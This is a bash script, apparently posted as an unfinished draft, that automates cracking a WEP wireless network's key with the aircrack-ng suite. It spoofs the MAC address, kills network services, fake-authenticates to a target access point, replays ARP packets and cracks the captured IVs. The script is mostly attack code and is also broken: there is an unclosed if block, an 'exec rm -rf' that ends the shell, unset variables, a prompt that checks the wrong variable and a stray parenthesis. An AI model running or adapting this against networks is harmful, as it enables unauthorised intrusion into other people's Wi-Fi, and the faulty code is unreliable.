# Looks like an unfinished version I once started. Looks close to completion.

#!/bin/bash
#
# Aircrack-ng wep crack automation script 
#
# Run as root
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


TERM=xterm
export LS_OPTIONS='--color=auto'

# Make sure root is running
if [ "$(id -u)" != "0" ]; then
    echo "You need to SU root" 1>&2
    exit 1
fi

# Ask to remove previous .cap and .ivs files
echo "Remove previous .cap and .ivs files? (y/n)"
    read -r answer
    if [[ "$answer" == "y" || "$answer" == "Y" ]] ; then
        exec rm -rf *.cap *.ivs
    else if   [[ "$answer" == "n" || "$answer" == "N" ]] ; then
	echo "Not removing files"
    else
	echo "Invalid response" 
    fi
clear 
 
# Go to promiscuous mode with random mac
echo "Wireless interface name"
read -r interface
ifconfig mon0 down
ifconfig wlan0 down        
MAC=`(date; cat /proc/interrupts) | md5sum | sed -r 's/^(.{10}).*$/\1/; s/([0-9a-f]{2})/\1:/g; s/:$//;'`
ifconfig wlan0 hw ether $MAC
ifconfig wlan0 up
airmon-ng start mon0 $channel


# Kill potentialy problem programs
echo "Killing potential adapter conflicts..."
killall NetworkManager
killall NetworkManagerDispatcher
killall wpa_supplicant
killall avahi-daemon
echo "Giving programs time to die..."
sleep 5
clear

# Run injection test on desired AP
xterm aireplay-ng -9 -e $ESSID -a $BSSID -i $DEVICE 

# Begin dumping captured IV's to a file
xterm airodump-ng -c $CHANNEL -w $FILE --bssid $BSSID $DEVICE

# Conduct fake authentication
xterm aireplay-ng -1 0 -a $BSSID -h $MAC -e $ESSID $DEVICE

# If access point is picky, reauth every 6000 seconds, keep alive 10s, 1 data set at a time
echo "Is the access point picky?"
read picky
if [[ "$answer" == "y" || "$answer" == "Y" ]] ; then
    xterm aireplay-ng -1 6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $MAC
	else
		echo "Great"
fi
clear

# ARP replay if ARP found
xterm aireplay-ng -3 -b $BSSID -h $MAC

# Decide if we are cracking PTW style or using Korek method
echo "Which craking method do you want to use, Pwn The World or korek?"
read 


xterm aircrack-ng -b $BSSID $FILE*.cap)

xterm aircrack-ng -K -b $BSSID $FILE*.cap

#killall airodump 



